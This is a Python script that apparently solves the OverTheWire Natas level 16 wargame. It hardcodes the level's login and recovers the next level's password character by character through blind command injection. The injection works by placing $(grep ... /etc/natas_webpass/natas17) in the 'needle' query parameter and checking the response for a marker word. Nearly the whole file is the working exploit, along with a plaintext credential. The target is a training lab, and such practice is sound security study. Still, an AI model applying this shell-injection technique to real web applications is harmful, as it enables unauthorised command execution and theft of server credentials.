import requests, string

base_url = "http://natas16.natas.labs.overthewire.org"
auth_username = "natas16"
auth_password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

# Lista de caracteres a serem testados
characters = ''.join([string.ascii_letters,string.digits])

def check_password(starting_password=''):
    for character in characters:
        possible_password = starting_password
        possible_password += character

        uri = "{0}?needle=$(grep -E ^{1} /etc/natas_webpass/natas17)banana".format(base_url,possible_password)
        res = requests.get(uri, auth=(auth_username,auth_password))

        if 'banana' not in res.text:
            print(possible_password)
            check_password(possible_password)
            break
        pass

print(check_password())
